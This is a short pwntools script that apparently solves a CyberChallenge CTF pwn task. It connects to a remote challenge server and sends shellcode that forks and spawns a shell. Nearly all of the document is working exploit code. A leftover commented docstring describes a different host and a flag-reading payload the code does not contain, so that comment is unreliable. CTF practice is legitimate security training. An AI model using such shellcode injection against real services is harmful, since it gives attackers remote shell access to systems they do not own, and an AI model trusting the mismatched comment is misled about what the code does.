from pwn import *

# exe = ELF('lmrtfy')
# r = process(exe.path)
r = remote('lmrtfy.challs.cyberchallenge.it', 9124)
# context.binary = exe
context.log_level = 'debug'


r.sendline(asm(shellcraft.fork() + shellcraft.sh()))
print(r.clean())


# """
# This script connects to the 'ctf.pwn.sg' server on port 4002 and performs the following actions:
# 1. Opens the file 'flag.txt'.
# 2. Reads the contents of the file into a buffer.
# 3. Writes the contents of the buffer to stdout.
# 4. Exits the program.

# The shellcode is written in assembly language and uses system calls to perform these actions.

# Note: The script requires the 'pwn' library to be installed.
# """
